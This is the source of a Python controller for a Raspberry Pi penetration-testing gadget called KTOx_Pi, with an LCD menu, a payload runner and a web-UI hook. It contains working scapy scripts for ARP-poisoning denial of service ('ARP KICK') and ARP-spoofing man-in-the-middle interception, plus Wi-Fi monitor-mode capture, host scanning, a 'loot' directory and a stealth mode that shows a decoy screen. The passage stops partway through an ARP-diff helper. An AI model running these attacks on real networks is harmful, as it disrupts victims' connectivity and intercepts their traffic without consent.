#!/usr/bin/env python3
# ktox_device.py — KTOx_Pi v1.0
# Raspberry Pi Zero 2W · Kali ARM64 · Waveshare 1.44" LCD HAT (ST7735S)
#
# Architecture: mirrors KTOx exactly
#   · Global image / draw / LCD objects
#   · _display_loop  — LCD_ShowImage() at ~10 fps continuously
#   · _stats_loop    — toolbar (temp + status) every 2 s
#   · draw_lock      — threading.Lock  on every draw call
#   · screen_lock    — threading.Event frozen during payload
#   · getButton()    — virtual (WebUI Unix socket) first, then GPIO
#   · exec_payload() — subprocess.run() BLOCKING + _setup_gpio() restore
#
# WebUI: device_server.py (WebSocket :8765) + web_server.py (HTTP :8080)
# Loot:  /root/KTOx/loot/  (symlinked from /root/KTOx/loot)
#
# Menu navigation
#   Joystick UP/DOWN     navigate
#   Joystick CTR/RIGHT   select / enter
#   KEY1  / LEFT         back
#   KEY2                 home
#   KEY3                 stop attack / exit payload

import os, sys, time, json, threading, subprocess, signal, socket, ipaddress
from datetime import datetime
from functools import partial
from pathlib import Path

# ── Paths ─────────────────────────────────────────────────────────────────────

KTOX_DIR     = "/root/KTOx"
INSTALL_PATH = KTOX_DIR + "/"
LOOT_DIR     = KTOX_DIR + "/loot"
PAYLOAD_DIR  = KTOX_DIR + "/payloads"
PAYLOAD_LOG  = LOOT_DIR + "/payload.log"
VERSION      = "1.0"

sys.path.insert(0, KTOX_DIR)

# ── Hardware imports ───────────────────────────────────────────────────────────

try:
    import RPi.GPIO as GPIO
    from PIL import Image, ImageDraw, ImageFont
    import LCD_1in44
    import LCD_Config
    import rj_input
    HAS_HW = True
except ImportError as _ie:
    print(f"[WARN] Hardware libs missing ({_ie}) — headless mode")
    HAS_HW = False

# ── GPIO pin map ───────────────────────────────────────────────────────────────

PINS = {
    "KEY_UP_PIN":    6,
    "KEY_DOWN_PIN":  19,
    "KEY_LEFT_PIN":  5,
    "KEY_RIGHT_PIN": 26,
    "KEY_PRESS_PIN": 13,
    "KEY1_PIN":      21,
    "KEY2_PIN":      20,
    "KEY3_PIN":      16,
}

# ── Threading primitives ───────────────────────────────────────────────────────

draw_lock   = threading.Lock()      # protect every draw call
screen_lock = threading.Event()     # set = freeze display / stats threads
_stop_evt   = threading.Event()

# ── Button debounce state ──────────────────────────────────────────────────────

_last_button       = None
_last_button_time  = 0.0
_button_down_since = 0.0
_debounce_s        = 0.10
_repeat_delay      = 0.25
_repeat_interval   = 0.08

# ── Live status text (updated by _stats_loop) ─────────────────────────────────

_status_text = ""
_temp_c      = 0.0

# ── Payload state paths ────────────────────────────────────────────────────────

PAYLOAD_STATE_PATH   = "/dev/shm/ktox_payload_state.json"
PAYLOAD_REQUEST_PATH = "/dev/shm/rj_payload_request.json"   # WebUI uses rj_ prefix

# ── Global LCD / image / draw (KTOx pattern — must be globals) ───────────

LCD   = None
image = None
draw  = None

# ── Fonts ──────────────────────────────────────────────────────────────────────

text_font  = None
small_font = None
icon_font  = None

def _load_fonts():
    global text_font, small_font, icon_font
    MONO_BOLD = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf"
    MONO      = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
    FA        = "/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf"
    def _f(p, sz):
        try:    return ImageFont.truetype(p, sz)
        except: return ImageFont.load_default()
    text_font  = _f(MONO_BOLD, 9)
    small_font = _f(MONO,      8)
    icon_font  = _f(FA,       11) if os.path.exists(FA) else _f(MONO, 9)

# ── Runtime state ──────────────────────────────────────────────────────────────

ktox_state = {
    "iface":       "eth0",
    "wifi_iface":  "wlan0",
    "gateway":     "",
    "hosts":       [],
    "running":     None,
    "mon_iface":   None,
    "stealth":     False,
    "stealth_image": None,
}

# ═══════════════════════════════════════════════════════════════════════════════
# ── Defaults / config class ────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

class Defaults:
    start_text    = [10, 20]
    text_gap      = 14
    install_path  = INSTALL_PATH
    payload_path  = PAYLOAD_DIR + "/"
    payload_log   = PAYLOAD_LOG
    imgstart_path = "/root/"
    config_file   = KTOX_DIR + "/gui_conf.json"

default = Defaults()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Colour scheme ──────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

class ColorScheme:
    border            = "#8B0000"
    background        = "#0a0a0a"
    text              = "#c8c8c8"
    selected_text     = "#FFFFFF"
    select            = "#640000"
    gamepad           = "#640000"
    gamepad_fill      = "#F0EDE8"

    def DrawBorder(self):
        draw.line([(127,12),(127,127)], fill=self.border, width=5)
        draw.line([(127,127),(0,127)],  fill=self.border, width=5)
        draw.line([(0,127),(0,12)],     fill=self.border, width=5)
        draw.line([(0,12),(128,12)],    fill=self.border, width=5)

    def DrawMenuBackground(self):
        draw.rectangle((3, 14, 124, 124), fill=self.background)

    def load_from_file(self):
        try:
            data = json.loads(Path(default.config_file).read_text())
            c = data.get("COLORS", {})
            self.border        = c.get("BORDER",            self.border)
            self.background    = c.get("BACKGROUND",         self.background)
            self.text          = c.get("TEXT",               self.text)
            self.selected_text = c.get("SELECTED_TEXT",      self.selected_text)
            self.select        = c.get("SELECTED_TEXT_BACKGROUND", self.select)
            self.gamepad       = c.get("GAMEPAD",            self.gamepad)
            self.gamepad_fill  = c.get("GAMEPAD_FILL",       self.gamepad_fill)
        except Exception:
            pass

color = ColorScheme()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Hardware init / restore ────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _setup_gpio():
    """
    (Re-)initialise GPIO + LCD.  Called once at boot and after every
    exec_payload() because payloads call GPIO.cleanup() on exit which
    kills the SPI bus.
    """
    global LCD, image, draw
    if not HAS_HW:
        if image is None:
            image = Image.new("RGB", (128, 128), "#0a0a0a")
            draw  = ImageDraw.Draw(image)
        return

    GPIO.setmode(GPIO.BCM)
    GPIO.setwarnings(False)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD   = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    LCD_Config.Driver_Delay_ms(50)   # 50ms settle after GPIO init
    image = Image.new("RGB", (LCD.width, LCD.height), "#0a0a0a")
    draw  = ImageDraw.Draw(image)


def _hw_init():
    """Full boot initialisation."""
    _setup_gpio()
    _load_fonts()
    color.load_from_file()
    # Show KTOx/KTOx logo BMP if available
    logo = Path(INSTALL_PATH + "img/logo.bmp")
    if HAS_HW and logo.exists():
        try:
            img = Image.open(logo)
            LCD.LCD_ShowImage(img, 0, 0)
            time.sleep(0.8)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════════════
# ── Background threads ─────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _temp() -> float:
    try:
        with open("/sys/class/thermal/thermal_zone0/temp") as f:
            return int(f.read()) / 1000
    except Exception:
        return 0.0


def _draw_toolbar():
    """Draw temp + status bar at y=0..11.  Caller holds draw_lock."""
    try:
        draw.rectangle([(0,0),(128,11)], fill="#0d0000")
        # Temp left side
        draw.text((1,1), f"{_temp_c:.0f}C", font=small_font, fill="#5a2020")
        # Version tag right side
        draw.text((100,1), f"v{VERSION}", font=small_font, fill="#3a0000")
        # Status or brand centre
        if _status_text:
            draw.text((22,1), _status_text[:14], font=small_font, fill=color.border)
        else:
            draw.text((34,1), "KTOx_Pi", font=small_font, fill="#4a0000")
        draw.line([(0,11),(128,11)], fill=color.border, width=1)
    except Exception:
        pass


def _stats_loop():
    global _status_text, _temp_c
    while not _stop_evt.is_set():
        if screen_lock.is_set():
            time.sleep(0.5)
            continue
        try:
            _temp_c = _temp()
            s = ""
            if ktox_state.get("running"):
                s = f"[{ktox_state['running'][:14]}]"
            elif subprocess.call(["pgrep","airodump-ng"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                s = "(WiFi scan)"
            elif subprocess.call(["pgrep","aireplay-ng"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                s = "(deauth)"
            elif subprocess.call(["pgrep","arpspoof"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                s = "(MITM)"
            elif subprocess.call(["pgrep","Responder"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                s = "(Responder)"
            _status_text = s
            with draw_lock:
                _draw_toolbar()
        except Exception:
            pass
        time.sleep(2)


def _display_loop():
    _FRAME_PATH     = os.environ.get("RJ_FRAME_PATH", "/dev/shm/ktox_last.jpg")
    _FRAME_ENABLED  = os.environ.get("RJ_FRAME_MIRROR", "1") != "0"
    _FRAME_INTERVAL = 1.0 / max(1.0, float(os.environ.get("RJ_FRAME_FPS", "10")))
    last_save = 0.0

    while not _stop_evt.is_set():
        if not screen_lock.is_set() and HAS_HW and LCD and image:
            mirror = None
            with draw_lock:
                try:
                    LCD.LCD_ShowImage(image, 0, 0)
                except Exception:
                    pass
                if _FRAME_ENABLED:
                    now = time.monotonic()
                    if now - last_save >= _FRAME_INTERVAL:
                        try:    mirror = image.copy()
                        except: pass
                        last_save = now
            if mirror:
                try:    mirror.save(_FRAME_PATH, "JPEG", quality=80)
                except: pass
        time.sleep(0.2)


def start_background_loops():
    threading.Thread(target=_stats_loop,   daemon=True).start()
    threading.Thread(target=_display_loop, daemon=True).start()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Button input ───────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def getButton(timeout=120):
    """
    Block until a button press and return its pin name string.
    Checks WebUI virtual buttons (Unix socket via rj_input) first.
    timeout: max seconds to wait (default 120 — prevents infinite freeze).
    Returns None on timeout.
    """
    global _last_button, _last_button_time, _button_down_since
    start = time.time()

    while True:
        # Hard timeout — prevents infinite freeze
        if (time.time() - start) > timeout:
            _last_button = None
            return None

        # Poll WebUI payload launch request
        if not screen_lock.is_set():
            req = _check_payload_request()
            if req:
                exec_payload(req)
                continue

        # Virtual button from WebUI (Unix socket)
        if HAS_HW:
            try:
                v = rj_input.get_virtual_button()
                if v:
                    _last_button = None
                    return v
            except Exception:
                pass

        if not HAS_HW:
            time.sleep(0.1)
            continue

        # Physical GPIO
        pressed = None
        for name, pin in PINS.items():
            try:
                if GPIO.input(pin) == 0:
                    pressed = name
                    break
            except Exception:
                pass

        if pressed is None:
            _last_button = None
            time.sleep(0.01)
            continue

        now = time.time()

        # Stuck-button safety: if same button held >4s without being consumed,
        # force-clear to prevent freeze
        if pressed == _last_button and (now - _button_down_since) > 4.0:
            _last_button = None
            time.sleep(0.1)
            continue

        if pressed != _last_button:
            _last_button       = pressed
            _last_button_time  = now
            _button_down_since = now
            return pressed

        if (now - _last_button_time) < _debounce_s:
            time.sleep(0.01)
            continue
        if ((now - _button_down_since) >= _repeat_delay
                and (now - _last_button_time) >= _repeat_interval):
            _last_button_time = now
            return pressed
        time.sleep(0.01)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Text / drawing helpers ─────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _centered(text, y, font=None, fill=None):
    if font is None: font = text_font
    if fill is None: fill = color.selected_text
    bbox = draw.textbbox((0,0), text, font=font)
    w    = bbox[2] - bbox[0]
    draw.text(((128-w)//2, y), text, font=font, fill=fill)


def _truncate(text, max_w, font=None, ellipsis="…"):
    if font is None: font = text_font
    if not text: return ""
    if draw.textbbox((0,0), text, font=font)[2] <= max_w:
        return text
    ew   = draw.textbbox((0,0), ellipsis, font=font)[2]
    lo, hi, best = 0, len(text), ""
    while lo <= hi:
        mid = (lo+hi)//2
        w   = draw.textbbox((0,0), text[:mid], font=font)[2]
        if w + ew <= max_w:
            best = text[:mid]; lo = mid+1
        else:
            hi = mid-1
    return best + ellipsis


def Dialog(text, wait=True):
    with draw_lock:
        _draw_toolbar()
        draw.rectangle([0,12,128,128],   fill=color.background)
        draw.rectangle([4,16,124,112],   fill="#0d0606")
        draw.rectangle([4,16,124,112],   outline=color.border, width=1)
        # horizontal rule
        draw.line([(4,100),(124,100)],   fill=color.border, width=1)
        lines = text.splitlines()
        y = 16 + max(4, (84 - len(lines)*14)//2)
        for line in lines:
            _centered(line, y, fill=color.text)
            y += 14
        # OK button
        draw.rectangle([44,102,84,112],  fill=color.select)
        _centered("OK", 103, fill=color.selected_text)
    if wait:
        time.sleep(0.25)
        getButton()


def Dialog_info(text, wait=True, timeout=None):
    with draw_lock:
        _draw_toolbar()
        draw.rectangle([3,14,124,124], fill=color.select)
        draw.rectangle([3,14,124,124], outline=color.border, width=2)
        lines = text.splitlines()
        y     = 14 + max(0, (110 - len(lines)*14)//2)
        for line in lines:
            _centered(line, y, fill=color.selected_text)
            y += 14
    if wait:
        time.sleep(0.25)
        getButton()
    elif timeout:
        end = time.time() + timeout
        while time.time() < end:
            time.sleep(0.2)


def YNDialog(a="Are you sure?", y="Yes", n="No", b=""):
    with draw_lock:
        _draw_toolbar()
        draw.rectangle([0,12,128,128],  fill=color.background)
        draw.rectangle([4,16,124,118],  fill="#0d0606")
        draw.rectangle([4,16,124,118],  outline=color.border, width=1)
        _centered(a, 20, fill=color.selected_text)
        if b: _centered(b, 36, fill=color.text)
        draw.line([(4,52),(124,52)],    fill=color.border, width=1)
    time.sleep(0.25)
    answer = False
    while True:
        with draw_lock:
            _draw_toolbar()
            # YES button
            yc_bg = color.select  if answer      else "#1a0505"
            nc_bg = color.select  if not answer  else "#1a0505"
            yc_tx = color.selected_text if answer      else color.text
            nc_tx = color.selected_text if not answer  else color.text
            draw.rectangle([8,56,58,72],   fill=yc_bg, outline=color.border)
            draw.rectangle([70,56,120,72], fill=nc_bg, outline=color.border)
            _centered(y, 58, fill=yc_tx)
            draw.text((76,58), n, font=text_font, fill=nc_tx)
            # hint
            draw.line([(4,80),(124,80)], fill="#2a0505", width=1)
            _centered("LEFT=Yes  RIGHT=No", 84, font=small_font, fill="#4a2020")
        btn = getButton()
        if   btn in ("KEY_LEFT_PIN","KEY1_PIN"):    answer = True
        elif btn in ("KEY_RIGHT_PIN","KEY3_PIN"):   answer = False
        elif btn in ("KEY_PRESS_PIN","KEY2_PIN"):   return answer


def GetMenuString(inlist, duplicates=False):
    """
    Scrollable list.  Returns selected label string, or "" on back.
    If duplicates=True returns (int_index, label_string).
    """
    WINDOW = 7
    if not inlist:
        inlist = ["(empty)"]
    if duplicates:
        inlist = [f"{i}#{t}" for i, t in enumerate(inlist)]
    total  = len(inlist)
    index  = 0
    offset = 0

    while True:
        if index < offset:           offset = index
        elif index >= offset+WINDOW: offset = index - WINDOW + 1
        window = inlist[offset:offset+WINDOW]

        with draw_lock:
            _draw_toolbar()
            color.DrawMenuBackground()
            color.DrawBorder()
            for i, raw in enumerate(window):
                txt = raw if not duplicates else raw.split("#", 1)[1]
                sel = (i == index - offset)
                row_y = 14 + 14*i
                if sel:
                    draw.rectangle([3, row_y, 124, row_y+12], fill=color.select)
                fill = color.selected_text if sel else color.text
                t = _truncate(txt.strip(), 110)
                draw.text((5, row_y+1), t, font=text_font, fill=fill)

        time.sleep(0.08)
        btn = getButton()
        if   btn == "KEY_DOWN_PIN":                    index = (index+1) % total
        elif btn == "KEY_UP_PIN":                      index = (index-1) % total
        elif btn in ("KEY_PRESS_PIN","KEY_RIGHT_PIN"):
            raw = inlist[index]
            if duplicates:
                idx, txt = raw.split("#", 1)
                return int(idx), txt
            return raw
        elif btn in ("KEY_LEFT_PIN","KEY1_PIN"):
            return (-1,"") if duplicates else ""


def RenderMenuWindowOnce(inlist, selected=0):
    WINDOW = 7
    if not inlist: inlist = ["(empty)"]
    total  = len(inlist)
    idx    = max(0, min(selected, total-1))
    offset = max(0, min(idx-2, total-WINDOW))
    window = inlist[offset:offset+WINDOW]
    with draw_lock:
        _draw_toolbar()
        color.DrawMenuBackground()
        color.DrawBorder()
        for i, txt in enumerate(window):
            sel   = (i == idx-offset)
            row_y = 14 + 14*i
            if sel:
                draw.rectangle([3, row_y, 124, row_y+12], fill=color.select)
            fill = color.selected_text if sel else color.text
            t = _truncate(txt.strip(), 110)
            draw.text((5, row_y+1), t, font=text_font, fill=fill)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Payload engine ─────────────────────────────────────════════════════════════
# ═══════════════════════════════════════════════════════════════════════════════

def _write_payload_state(running: bool, path=None):
    try:
        with open(PAYLOAD_STATE_PATH, "w") as f:
            json.dump({"running": running, "path": path, "ts": time.time()}, f)
    except Exception:
        pass


def _check_payload_request():
    try:
        if not os.path.isfile(PAYLOAD_REQUEST_PATH):
            return None
        with open(PAYLOAD_REQUEST_PATH) as f:
            data = json.load(f)
        os.remove(PAYLOAD_REQUEST_PATH)
        if data.get("action") == "start" and data.get("path"):
            return str(data["path"])
    except Exception:
        pass
    return None


def exec_payload(filename, *args):
    """
    Execute a KTOx/KTOx-compatible payload.
    BLOCKING — menu is frozen until payload exits.
    Fully restores GPIO + LCD after payload calls GPIO.cleanup().
    """
    if isinstance(filename, (list, tuple)):
        args     = tuple(filename[1:]) + args
        filename = filename[0]

    # Resolve absolute path
    if os.path.isabs(filename):
        full = filename
    else:
        full = os.path.join(default.payload_path, filename)
    if not full.endswith(".py"):
        full += ".py"
    if not os.path.isfile(full):
        Dialog(f"Not found:\n{os.path.basename(full)}", wait=True)
        return

    print(f"[PAYLOAD] ► {filename}")
    _write_payload_state(True, filename)
    screen_lock.set()

    if HAS_HW:
        try:
            with draw_lock:
                LCD.LCD_Clear()
        except Exception:
            pass

    env = os.environ.copy()
    env["PYTHONPATH"] = (
        INSTALL_PATH + os.pathsep
        + KTOX_DIR   + os.pathsep
        + env.get("PYTHONPATH", "")
    )
    env["KTOX_PAYLOAD"]      = "1"
    env["KTOX_LOOT_DIR"]     = LOOT_DIR
    env["PAYLOAD_LOOT_DIR"]  = LOOT_DIR

    os.makedirs(LOOT_DIR, exist_ok=True)
    log_fh = open(default.payload_log, "ab", buffering=0)

    try:
        result = subprocess.run(
            ["python3", full] + list(args),
            cwd=INSTALL_PATH,
            env=env,
            stdout=log_fh,
            stderr=subprocess.STDOUT,
        )
        if result.returncode != 0:
            print(f"[PAYLOAD] exit code {result.returncode}")
    except Exception as exc:
        print(f"[PAYLOAD] ERROR: {exc!r}")
    finally:
        log_fh.close()

    # ── Restore hardware ────────────────────────────────────────────────────
    print("[PAYLOAD] ◄ Restoring hardware…")
    _write_payload_state(False)
    _setup_gpio()
    _load_fonts()

    try:
        rj_input.restart_listener()
    except Exception:
        pass

    with draw_lock:
        try:
            draw.rectangle((0,0,128,128), fill=color.background)
            color.DrawBorder()
        except Exception:
            pass

    m.render_current()

    # Drain any held buttons + clear stale state (500ms max)
    global _last_button, _last_button_time, _button_down_since
    _last_button       = None
    _last_button_time  = 0.0
    _button_down_since = 0.0
    if HAS_HW:
        t0 = time.time()
        while (any(GPIO.input(p) == 0 for p in PINS.values())
               and time.time()-t0 < 0.5):
            time.sleep(0.03)
    _last_button = None  # clear again after drain

    screen_lock.clear()
    print("[PAYLOAD] ✔ ready")

# ═══════════════════════════════════════════════════════════════════════════════
# ── Network helpers ────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _run(cmd, timeout=15):
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
            shell=isinstance(cmd, str)
        )
        return r.returncode, r.stdout + r.stderr
    except Exception as e:
        return -1, str(e)


def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        pass
    # Fallback: read from interface directly
    try:
        rc, out = _run(["ip","-4","addr","show",ktox_state["iface"]], timeout=3)
        import re
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
        if m: return m.group(1)
    except Exception:
        pass
    return "0.0.0.0"


def get_gateway():
    try:
        rc, out = _run(["ip", "route", "show", "default"], timeout=4)
        import re
        m = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", out)
        return m.group(1) if m else ""
    except Exception:
        return ""


def detect_iface():
    """Find first active wired/USB interface — single subprocess call."""
    try:
        rc, out = _run(["ip","-o","link","show"], timeout=5)
        import re
        # Prefer eth0/usb0 (wired), then wlan1 (external wifi), then wlan0
        ifaces = re.findall(r"\d+: (\w+):", out)
        for preferred in ("eth0","usb0","eth1","wlan1"):
            if preferred in ifaces:
                return preferred
        # Return first non-lo non-wlan0 interface
        for i in ifaces:
            if i not in ("lo","wlan0"):
                return i
    except Exception:
        pass
    return "eth0"


def refresh_state():
    ktox_state["iface"]   = detect_iface()
    ktox_state["gateway"] = get_gateway()


def loot_count():
    try: return len(list(Path(LOOT_DIR).glob("**/*")))
    except: return 0

# ═══════════════════════════════════════════════════════════════════════════════
# ── Stealth mode ───────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def enter_stealth():
    """
    Blank LCD (or show decoy image). Device keeps running everything.
    Exit: KEY1 + KEY3 held 3 s, or WebUI toggle (write {"stealth":false}
    to /dev/shm/ktox_stealth.json).
    """
    ktox_state["stealth"] = True
    decoy = ktox_state.get("stealth_image")
    if HAS_HW and LCD:
        if decoy and os.path.exists(str(decoy)):
            try:
                img = Image.open(decoy).resize((128,128)).convert("RGB")
                with draw_lock:
                    LCD.LCD_ShowImage(img, 0, 0)
            except Exception:
                with draw_lock: LCD.LCD_Clear()
        else:
            with draw_lock: LCD.LCD_Clear()

    held_since = None
    STEALTH_CMD = "/dev/shm/ktox_stealth.json"

    while ktox_state["stealth"]:
        # WebUI toggle
        try:
            if os.path.isfile(STEALTH_CMD):
                data = json.loads(Path(STEALTH_CMD).read_text())
                os.remove(STEALTH_CMD)
                if not data.get("stealth", True):
                    break
        except Exception:
            pass
        # Physical button combo
        if HAS_HW:
            try:
                k1 = GPIO.input(PINS["KEY1_PIN"]) == 0
                k3 = GPIO.input(PINS["KEY3_PIN"]) == 0
                if k1 and k3:
                    if held_since is None: held_since = time.time()
                    elif time.time() - held_since >= 3.0: break
                else:
                    held_since = None
            except Exception:
                pass
        time.sleep(0.2)

    ktox_state["stealth"] = False
    Dialog_info("Stealth off", wait=False, timeout=1.5)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Attack helpers ─────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _run_attack(title, cmd, shell=False):
    """Live-streaming attack runner with KEY3=stop."""
    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
    logpath = f"{LOOT_DIR}/atk_{title.lower().replace(' ','_')}_{ts}.log"
    os.makedirs(LOOT_DIR, exist_ok=True)
    logfh   = open(logpath, "w")

    proc = subprocess.Popen(
        cmd, shell=shell,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    ktox_state["running"] = title
    lines   = [f"Starting {title}…"]
    elapsed = 0

    def _reader():
        for line in proc.stdout:
            line = line.strip()
            if line:
                logfh.write(f"[{time.strftime('%H:%M:%S')}] {line}\n")
                logfh.flush()
                lines.append(line[:22])
                if len(lines) > 5: lines.pop(0)
    threading.Thread(target=_reader, daemon=True).start()

    try:
        while proc.poll() is None:
            with draw_lock:
                _draw_toolbar()
                color.DrawMenuBackground()
                color.DrawBorder()
                draw.rectangle([3,14,124,26], fill=color.select)
                _centered(title[:18], 15, fill=color.selected_text)
                pulse = "●" if elapsed % 2 == 0 else "○"
                draw.text((115,15), pulse, font=text_font, fill=color.border)
                y = 30
                for line in lines[-5:]:
                    c = "#1E8449" if line.startswith("✔") else \
                        "#C0392B" if line.startswith("✖") else \
                        "#D4AC0D" if line.startswith("!") else color.text
                    draw.text((5,y), line[:20], font=text_font, fill=c)
                    y += 12
                draw.text((5,108), f"Elapsed: {elapsed}s",
                          font=small_font, fill="#606060")
                draw.rectangle([3,116,124,124], fill="#222222")
                _centered("KEY3=stop", 117, font=small_font,
                          fill=color.text)
            btn = getButton(timeout=1)
            if btn == "KEY3_PIN": break
            elapsed += 1
    except KeyboardInterrupt:
        pass
    finally:
        if proc.poll() is None:
            proc.terminate()
            try: proc.wait(timeout=3)
            except: proc.kill()
        logfh.close()
        ktox_state["running"] = None
    return elapsed


def _pick_host():
    hosts = ktox_state["hosts"]
    if not hosts:
        Dialog_info("No hosts.\nRun scan first.", wait=True)
        return None
    items = []
    for h in hosts:
        ip = h.get("ip",h[0]) if isinstance(h,dict) else h[0]
        items.append(f" {ip}")
    sel = GetMenuString(items)
    return sel.strip() if sel else None

# ═══════════════════════════════════════════════════════════════════════════════
# ── KTOx attack modules ────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def do_network_scan():
    Dialog_info("Scanning network…", wait=False, timeout=1)
    gw = ktox_state["gateway"]
    if not gw:
        Dialog_info("No gateway!\nCheck connection.", wait=True)
        return
    net = gw.rsplit(".",1)[0]+".0/24"
    rc, out = _run(["nmap","-sn","-T4","--oG","-",net], timeout=90)
    import re
    hosts = []
    for mo in re.finditer(r"Host: (\d+\.\d+\.\d+\.\d+)\s+\(([^)]*)\)", out):
        hosts.append({"ip":mo.group(1),"hostname":mo.group(2),"mac":"","vendor":""})
    ktox_state["hosts"] = hosts
    lines = [f"✔ {len(hosts)} host(s) found", f"  Net: {net}"]
    for h in hosts[:4]: lines.append(f"  {h['ip']}")
    if len(hosts)>4: lines.append(f"  +{len(hosts)-4} more")
    GetMenuString(lines)


def do_arp_kick(target_ip):
    _run_attack("ARP KICK", [
        "python3","-c",
        f"""
import sys,time; sys.path.insert(0,'{KTOX_DIR}')
from scapy.all import *
iface='{ktox_state["iface"]}'; gw='{ktox_state["gateway"]}'; tgt='{target_ip}'
try:
    iface_mac=get_if_hwaddr(iface)
    ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=tgt),timeout=2,verbose=0,iface=iface)
    tgt_mac=ans[0][1][Ether].src if ans else 'ff:ff:ff:ff:ff:ff'
    print(f'Kicking {{tgt}} via {{iface}}')
    for i in range(600):
        sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=gw,hwsrc=iface_mac),iface=iface,verbose=0)
        time.sleep(5)
except Exception as e:
    print(f'Error: {{e}}')
"""
    ])


def do_mitm(target_ip):
    _run_attack("ARP MITM", [
        "python3","-c",
        f"""
import sys,os,time; sys.path.insert(0,'{KTOX_DIR}')
from scapy.all import *
iface='{ktox_state["iface"]}'; gw='{ktox_state["gateway"]}'; tgt='{target_ip}'
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
try:
    iface_mac=get_if_hwaddr(iface)
    ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=tgt),timeout=2,verbose=0,iface=iface)
    tgt_mac=ans[0][1][Ether].src if ans else None
    ans2,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gw),timeout=2,verbose=0,iface=iface)
    gw_mac=ans2[0][1][Ether].src if ans2 else None
    if not tgt_mac or not gw_mac: print('Cannot resolve MACs'); sys.exit(1)
    print(f'MITM: {{tgt}} <-> {{gw}}')
    while True:
        sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=gw,hwsrc=iface_mac),iface=iface,verbose=0)
        sendp(Ether(dst=gw_mac)/ARP(op=2,pdst=gw,hwdst=gw_mac,psrc=tgt,hwsrc=iface_mac),iface=iface,verbose=0)
        time.sleep(3)
except Exception as e:
    print(f'Error: {{e}}')
finally:
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
    print('IP forwarding disabled')
"""
    ])


def do_wifi_monitor_on():
    Dialog_info("Enabling\nmonitor mode…", wait=False, timeout=1)
    _run(["airmon-ng","check","kill"], timeout=10)
    rc, out = _run(["airmon-ng","start",ktox_state["wifi_iface"]], timeout=15)
    import re
    mo = re.search(r"(wlan\w*mon|mon\d+)", out)
    if mo:
        ktox_state["mon_iface"] = mo.group(1)
        Dialog_info(f"Monitor on:\n{mo.group(1)}", wait=True)
    else:
        rc3, out3 = _run(["iw","dev"])
        for iface in re.findall(r"Interface\s+(\w+)", out3):
            if iface.endswith("mon"):
                ktox_state["mon_iface"] = iface
                Dialog_info(f"Monitor on:\n{iface}", wait=True)
                return
        Dialog_info("Monitor FAILED.\nCheck adapter.", wait=True)


def do_wifi_monitor_off():
    mon = ktox_state.get("mon_iface")
    if not mon:
        Dialog_info("Not in monitor\nmode.", wait=True)
        return
    _run(["airmon-ng","stop",mon], timeout=10)
    _run(["systemctl","start","NetworkManager"], timeout=5)
    ktox_state["mon_iface"] = None
    Dialog_info("Monitor off.\nNM restarted.", wait=True)


def do_wifi_scan():
    mon = ktox_state.get("mon_iface")
    if not mon:
        Dialog_info("Enable monitor\nmode first.", wait=True)
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    outpath = f"{LOOT_DIR}/wifi_scan_{ts}"
    _run_attack("WiFi SCAN",
        ["airodump-ng","--write",outpath,"--output-format","csv",
         "--write-interval","3",mon])


def do_arp_watch():
    _run_attack("ARP WATCH",[
        "python3","-c",
        "from scapy.all import sniff,ARP\n"
        "known={}\n"
        "def h(p):\n"
        "  if ARP in p and p[ARP].op==2:\n"
        "    ip=p[ARP].psrc;mac=p[ARP].hwsrc\n"
        "    if ip in known and known[ip]!=mac:\n"
        "      print(f'! CONFLICT {ip} {known[ip][:11]} -> {mac[:11]}')\n"
        "    known[ip]=mac\n"
        "sniff(prn=h,filter='arp',store=0)"
    ])


def do_arp_diff():
    _run_attack("ARP DIFF",[
        "python3","-c",
        "import subprocess,time\n"
        "def arp():\n"
